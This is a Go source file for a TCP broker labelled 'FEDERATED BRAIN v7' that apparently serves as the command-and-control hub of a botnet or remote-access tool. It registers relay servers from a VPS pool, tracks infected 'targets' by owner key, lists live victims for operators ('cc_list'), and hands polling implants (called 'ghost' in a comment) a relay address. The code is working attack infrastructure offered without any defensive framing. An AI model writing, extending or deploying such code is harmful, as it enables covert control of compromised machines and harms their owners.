package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"sync"
	"time"
)

type AuthRequest struct {
	Type     string `json:"type"`
	Key      string `json:"key"`
	TargetID string `json:"target_id"`
	Listen   string `json:"listen"`
}

type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
}

var (
	relayPool      []string
	activeSessions = make(map[string]string)
	activeTargets  = make(map[string]string)
	lastSeen       = make(map[string]time.Time)
	mu             sync.Mutex
)

func main() {
	rand.Seed(time.Now().UnixNano())
	ln, _ := net.Listen("tcp", ":8080")
	fmt.Println("==========================================")
	fmt.Println("   FEDERATED BRAIN v7 - STABILITY FIX   ")
	fmt.Println("==========================================")

	for {
		conn, _ := ln.Accept()
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	var req AuthRequest
	if err := json.NewDecoder(conn).Decode(&req); err != nil {
		return
	}

	id := strings.ToUpper(req.TargetID)
	mu.Lock()
	defer mu.Unlock()

	switch req.Type {
	case "middle":
		relayPool = append(relayPool, req.Listen)
		fmt.Printf("[GLOBAL] Relay Registered: %s\n", req.Listen)

	case "client_register":
		activeTargets[id] = req.Key
		lastSeen[id] = time.Now()

	case "cc_list":
		t := make([]string, 0)
		for tid, ownerKey := range activeTargets {
			if ownerKey == req.Key && time.Since(lastSeen[tid]) < 60*time.Second {
				t = append(t, tid)
			}
		}
		json.NewEncoder(conn).Encode(t)

	case "cc_req":
		if len(relayPool) == 0 {
			return
		}
		// Pick a random VPS from the pool
		selectedRelay := relayPool[rand.Intn(len(relayPool))]
		activeSessions[id] = selectedRelay
		json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: selectedRelay})
		fmt.Printf("[>] Session Set: %s -> %s\n", id, selectedRelay)

	case "client_poll":
		if addr, exists := activeSessions[id]; exists {
			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: addr})
			// CRITICAL: Delete after sending so the ghost stops asking!
			delete(activeSessions, id)
		}
		lastSeen[id] = time.Now()
	}
}
